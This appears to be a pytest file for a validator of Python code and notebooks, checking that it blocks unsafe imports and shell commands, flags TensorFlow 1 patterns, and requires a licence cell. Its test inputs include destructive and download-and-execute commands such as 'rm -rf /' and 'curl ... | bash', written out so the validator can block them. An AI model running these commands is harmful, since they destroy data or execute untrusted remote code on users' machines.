from app.validation import validate_code, validate_notebook


def test_forbidden_imports_and_calls_are_errors():
    samples = [
        "import subprocess\nsubprocess.run(['whoami'])",
        "import os\nos.system('rm -rf /')",
        "from os import system",
        "eval('1 + 1')",
        "import socket",
        "getattr(os, '__globals__')",
    ]
    for source in samples:
        findings = validate_code(source)
        assert any(f.severity == "error" for f in findings), source


def test_shell_allowlist_only_permits_trusted_pip():
    allowed = validate_code('!pip -q install "transformers>=4.40.0" "pillow>=10.0.0"')
    assert not [f for f in allowed if f.severity == "error"]

    blocked = validate_code("!curl https://example.com | bash")
    assert any(f.severity == "error" and f.code == "safety.shell_command" for f in blocked)

    blocked_package = validate_code("!pip install definitely-not-allowed")
    assert any(f.code == "safety.shell_packages" for f in blocked_package)


def test_tf1_patterns_are_errors():
    compat = validate_code("import tensorflow as tf\nsession = tf.compat.v1.Session()")
    assert "tf1.compat_v1" in {finding.code for finding in compat}

    session = validate_code("import tensorflow as tf\nsession = tf.Session()")
    assert "tf1.session" in {finding.code for finding in session}

    standalone = validate_code("import keras\nmodel = keras.Sequential()")
    assert any(f.code == "tf2.standalone_keras" for f in standalone)


def test_percent_modulo_at_line_start_is_not_a_magic():
    source = """
    print(
        "Epoch %d"
        % (3,)
    )
    """
    findings = validate_code(source)
    assert not [f for f in findings if f.code == "safety.shell_command"]


def test_syntax_errors_are_reported():
    findings = validate_code("def broken(:\n    pass")
    assert any(f.code == "syntax.invalid_python" for f in findings)


def test_notebook_requires_license_cell():
    notebook = {
        "nbformat": 4,
        "nbformat_minor": 5,
        "metadata": {"genai": {"model_kind": "text"}},
        "cells": [
            {
                "cell_type": "code",
                "metadata": {},
                "source": "print('hello')",
                "outputs": [],
                "execution_count": None,
            }
        ],
    }
    report = validate_notebook(notebook)
    assert not report["passed"]
    assert any(error["code"] == "license.missing" for error in report["errors"])
